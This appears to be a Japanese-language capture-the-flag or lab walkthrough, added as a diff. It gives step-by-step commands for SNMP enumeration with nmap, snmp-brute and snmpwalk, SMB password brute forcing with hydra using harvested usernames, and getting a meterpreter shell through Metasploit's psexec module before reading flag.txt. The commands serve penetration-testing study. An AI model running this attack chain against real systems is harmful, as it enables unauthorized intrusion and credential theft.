@@ -1,0 +1,34 @@
+SNMP分析
+1) pingでターゲットホストの稼働を確認する
+2) nmapでセキュリティホールの稼働を確認する
+*nmapはデフォルトでは、UDPポートが開いているかはチェックしないので、
+nmap -sU -p- ターゲットで調べる必要がある。
+3) snmp-bruteスクリプトを使って、コミュニティー文字列を見つける
+nmap -sU -p 161 --script=snmp-brute ターゲットドメイン
+4) snmpwalkツールを実行して、snmp経由ですべての情報を検索する
+snmpwalk -v 1 -c コミュニティ文字列 ターゲットドメイン
+-v：バージョンオプション
+＊しかしこれは、適切に読み取り可能な形式ではない
+そのため、以下のコマンドを使用して行う
+nmap -sU -p 161 --script snmp-* ターゲットドメイン > snmp_output
+→ここのアウトプットファイルには、実行中のプロセス、ユーザー、サービス名、インストールされているアプリケーション
+5) 4)で見つけたユーザー名を利用して、ブルートフォースを行う
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ターゲットドメイン smb
+
+6) metasploitを使って、meterpreterを取得する
+msfconsole -q
+search psexec
+use 
+show options
+set RHOSTS
+set SMBUSER
+set SMBPASS
+exploit
+
+*Psexec：このモジュールは、有効なクレデンシャルを使って任意のペイロードを実行する
+
+7) フラグを取得する
+shell
+cd C:\
+dir 
+type flag.txt
